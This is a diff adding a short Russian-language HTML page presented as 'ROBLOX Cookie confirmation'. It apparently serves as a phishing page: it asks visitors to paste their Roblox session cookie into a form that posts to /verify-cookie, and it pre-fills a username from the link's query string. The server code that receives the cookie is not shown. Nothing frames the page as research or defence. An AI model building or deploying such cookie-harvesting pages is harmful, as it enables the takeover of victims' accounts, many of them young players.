@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <title>Подтверждение ROBLOX</title>
+  <link rel="stylesheet" href="/style.css" />
+</head>
+<body>
+  <div class="form-container">
+    <h2>Подтверждение ROBLOX Cookie</h2>
+    <form action="/verify-cookie" method="POST">
+      <input type="text" name="cookie" placeholder="ROBLOX Cookie" required />
+      <input type="hidden" name="username" value="" id="usernameField" />
+      <button type="submit">Подтвердить</button>
+    </form>
+  </div>
+
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const username = params.get("username");
+    if (username) {
+      document.getElementById("usernameField").value = username;
+    }
+  </script>
+</body>
+</html>
